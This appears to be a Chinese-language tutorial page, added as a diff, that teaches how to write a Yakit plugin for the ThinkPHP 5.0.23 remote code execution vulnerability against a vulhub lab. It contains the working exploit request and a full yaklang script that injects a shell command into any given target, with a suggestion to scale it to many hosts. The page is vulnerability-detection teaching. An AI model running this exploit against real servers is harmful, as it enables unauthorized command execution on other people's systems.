@@ -1,0 +1,253 @@
+---
+sidebar_position: 2
+---
+
+# ThinkPHP-5.0.23-RCE
+
+> ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。 最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。 ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。
+
+ThinkPHP RCE 是一个非常简单且便捷的可以用来制作插件编写教程的漏洞。本文我们将会比较详细的总结在这个 PoC 编写过程中遇到的问题，争取使用一个案例形成插件编写范式。
+
+import TOCInline from '@theme/TOCInline';
+
+<TOCInline toc={toc} />
+
+## 准备工作
+
+### 漏洞原理详见
+
+> Reference: https://www.anquanke.com/post/id/222672
+
+### 漏洞靶场
+
+**注意: 我们使用 [`vulhub`中 ThinkPHP 框架的靶场作为目标靶场](https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce)**
+
+通过对靶场的了解，我们通过
+
+```bash
+git clone https://github.com/vulhub/vulhub --depth 1
+cd vulhub/thinkphp/5.0.23-rce
+docker-compose up -d
+```
+
+来启动靶场，然后阅读 `README`，我们发现以下数据包是关键 PoC：
+
+```http title="ThinkPHP 5023 PoC 数据包" {11}
+POST /index.php?s=captcha HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+```
+
+我们在靶场搭建完成后，使用 Yakit 观察修改之后数据包的相关行为。
+
+![](/img/products/yakit/thinkphp-poc-fuzzer.png)
+
+我们发现找到 `server[REQUEST_METHOD]=id` 为执行命令的点，通过调整命令，我们可以很容易地看到执行结果。
+
+为了更好的验证结果，我们可以使用 `expr 1 + 12312` 命令
+
+:::info
+
+expr 命令是 Linux/Unix 下的很好地无害验证命令执行的办法。
+
+具体用法可以简单参考
+
+```bash
+ > expr 14 % 9
+ 5
+ > expr 10 + 10
+ 20
+ > expr 1000 + 900
+ 1900
+ > expr 30 / 3 / 2
+ 5
+ > expr 30 \* 3   # (使用乘号时，必须用反斜线屏蔽其特定含义。因为shell可能会误解显示星号的意义)
+ 90
+ > expr 30 * 3
+```
+
+> 1. https://www.runoob.com/linux/linux-comm-expr.html
+> 1. https://linuxhint.com/expr-command-bash/
+
+:::
+
+当然，有些时候，我们可以使用其他同样无害的方式来检测漏洞是否存在
+
+1. 使用 md5sum 的命令 `echo -n 'your-string' | md5sum`
+1. 使用 expr 构造一个表达式让系统运算，我们检测运算结果
+1. ...
+
+## 着手编写 PoC
+
+在 yaklang 中，我们有很多办法编写 PoC，面对这种最基础的情况，为了和上面提到的内容做一点照应，我们使用
+
+`echo -n 'random-string' | md5sum`
+
+来做漏洞验证。
+
+为此我们编写了我们的核心 PoC，主要步骤如下：
+
+1. 编写核心发包函数
+1. 获取参数
+1. 生成一个 cmd 与对应的 payload token
+1. 发送数据包
+1. 取出发送的数据包中的结果，检测内容
+
+### Talk is Cheap, Show Me the Code;
+
+```go
+// echo -n 'asdfasdf' | md5sum
+log.setLevel("info")  // 设置日志级别
+
+// 编写核心发包函数
+sendPacket = func(target, cmd) {
+    return poc.HTTP(`POST /index.php?s=captcha HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={{url({{params(cmd)}})}}`,
+        poc.params({
+            "cmd": cmd,
+            "target": target,
+        }),
+    )
+}
+
+// 获取参数
+target = cli.String("target")
+if target == "" {
+    die("no target")
+}
+
+// 生成一个 cmd 和对应的 payload token
+randomStr = str.RandStr(20)
+result = codec.Md5(randomStr)
+log.info("generate random md5 token: %v", result)
+cmd = sprintf("echo -n '%v' | md5sum", randomStr)
+
+// 使用生成的命令发包
+rsp, _, err = sendPacket(target, cmd)
+die(err)
+
+// 取出发送的数据包中的结果，检测内容
+headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(body, result) {
+    log.info("find token: %v", result)
+}
+```
+
+用户可以看到，其实每一步骤走下来，非常直观，我们的想法均可以很简单的通过一两句代码执行成为现实。
+
+但是代码中仍然有一些细节，用户可能一知半解。我们接下来针对代码中的内容做更详细的解释
+
+### `poc.HTTP` 通过数据包模版发送请求
+
+`poc.HTTP` 是一个为 PoC 检测场景而生的特殊 HTTP 库，他的主打并不是为开发完整支持 HTTP 请求，而是直接操作底层套接字，自己实现了 proxy 与 response 的各种响应操作。为用户提供最原汁原味的数据包层面的交互体验。
+
+当然交互就要涉及到参数的传递与渲染。
+
+`poc.HTTP` 原生支持 `yak.fuzz` 语法，同时也支持参数扩展语法（本质上也是一种 `yak.fuzz` 语法）。
+
+我们在上述代码中，就同时使用了 `yak.fuzz` 的编码语法与参数扩展语法。
+
+![](/img/products/yakit/poc-http-params.png)
+
+我们使用红色方框标注了两个块儿
+
+1. `{{params(target)}}` 这个块儿的意思是，渲染一个参数，参数名为 target，这个参数通过 `poc.params({"target": "your-target"})` 传入。
+1. `{{url({{params(cmd)}})}}` 其实氛围两部分：`{{params(cmd)}}` 和 `{{url(...)}}`：
+    1. 当然 `{{params(cmd)}}` 我们已经很熟悉了，意思是渲染 `cmd` 参数;
+    2. `{{url(...)}}` 的意思是 "把括号内的内容进行 URL 编码"。
+
+:::info 参考资料 `yak.fuzz`
+
+`yaklang.io` 在 `fuzz` 模块的相关教程有三篇，大家可以参考
+
+1. [yak.fuzz 基础教程](/docs/newforyak/fuzz_tutorial)
+1. [yak.fuzz 高级教程](/docs/newforyak/fuzz_for_more)
+1. [yak.fuzz 语法与接口操作手册](/docs/buildinlibs/lib_fuzz)
+
+:::
+
+大家在使用的时候，要注意的地方是编码问题，例如案例中我们的数据包注入命令的位置在 `POST` 的参数中。
+
+这里要求被 URL 编码，所以我们启用 `{{url(...)}}` 的 `yak.fuzz` 语法进行编码。
+
+当然，解决方案并不只有一种，我们可以不用 `{{url(...)}}`。在 `poc.params({"cmd": codec.EncodeUrl(cmd)})` 中，使用 `codec.EncodeUrl` 也同样可以达到同样效果
+
+:::info yak.codec 模块
+
+`codec` 是 `yaklang.io` 进行编码与解码，加密与解密的辅助模块，可以参考 [yak.codec 接口手册](/docs/api/codec)。
+
+:::
+
+### 如何 "优雅地" 判断结果？
+
+按照经验来说，绝大部分普通漏洞的判断逻辑可以分为 "与 / 或" 逻辑。
+
+所以，我们在 `str` 模块中为大家准备了两套函数可以很好覆盖这种场景
+
+1. `str.MatchAllOfSubString/Regexp/Glob` 判断一段数据中是否都满足后面的规则。
+1. `str.MatchAnyOfSubString/Regexp/Glob` 判断一段数据中是否满足后面的规则中的某一条。
+
+:::note
+
+大家可以参考 [str.Match\(All/Any\)Of\(SubString/Glob/Regexp\) 函数定义](/docs/api/str#strmatchallofglob)
+
+:::
+
+在实际的使用中，我们可以看 DEMO 中是如何使用的
+
+```go
+// 取出发送的数据包中的结果，检测内容
+headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(body, result) {
+    log.info("find token: %v", result)
+}
+```
+
+我们使用了 `str.SplitHTTPHeadersAndBodyFromPacket` 来把数据包的 header 和 body 分开，然后对 body 来进行子字符串匹配。
+
+## 制作一个 Yakit 插件
+
+当我们代码编写完成之后，我可以把它复制到 Yakit 插件参数 "新插件" 中。我们直接来给大家做展示：
+
+<video
+    src="https://yaklang.oss-cn-beijing.aliyuncs.com/video/code-to-yakit-plugin.mp4"
+    loop={true} playsInline={true} controls={true} autoPlay={true} style={{width: 890}}
+/>
+
+当然，我们上面用到了我们提到的 `StatusCard` 特性，在结果生成了一个状态卡片。
+
+我们也可以增加一些进度条与输出日志，来告诉大家的运行步骤！这样做会让你的插件看起来更加专业美观。
+
+我们只需要把 [插件编写指南：插件交互式输出](/products/plugins/plugin_output) 中介绍的交互方法加以应用即可生成一个美观好用的插件了！
+
+<video
+    src="https://yaklang.oss-cn-beijing.aliyuncs.com/video/code-to-yakit-with-user-interaction.mp4"
+    loop={true} playsInline={true} controls={true} autoPlay={true} style={{width: 890}}
+/>
+
+## 课后作业：扩展
+
+我们简单封装了上述模块之后，我们仍然是只能针对单体漏洞进行检测，那么如何针对大规模的目标进行扫描呢？
+
+大家可以发挥想象力，`str.ParseStringToHosts` 这类函数可以帮助大家解决这些问题。同样的，在之前的文章中，我们也介绍了一些内容来帮助大家解决问题。
+
+[漏洞 PoC 规模化验证](/docs/newforyak/how_to_make_poc#%E6%BC%8F%E6%B4%9E-poc-%E8%A7%84%E6%A8%A1%E5%8C%96%E6%AD%A6%E5%99%A8%E5%8C%96)
+
+> Happy Coding!
